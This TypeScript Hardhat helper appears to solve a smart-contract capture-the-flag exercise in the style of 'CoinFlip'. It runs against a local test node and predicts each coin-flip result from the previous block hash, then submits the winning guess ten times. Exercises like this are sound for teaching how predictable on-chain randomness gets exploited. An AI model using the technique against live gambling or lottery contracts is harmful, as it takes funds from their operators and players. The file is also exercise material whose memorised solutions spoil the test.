import { expect } from "chai";
import { ethers } from "hardhat";

const helper = async (victim: any, attacker: any) => {
  // add code here that will help you pass the test
  const coinFlipSalt = BigInt(57896044618658097711785492504343953926634992332820282019728792003956564819968);
  const provider = new ethers.providers.JsonRpcProvider('http://127.0.0.1:8545');

  for (let i = 0; i < 10; i++) {
    const latestBlockNumber = await provider.getBlockNumber() + 1;
    const previousBlockHash = BigInt((await provider.getBlock(latestBlockNumber - 1)).hash);
    await victim.flip((previousBlockHash / coinFlipSalt) == BigInt(1));
  }
};

export default helper;
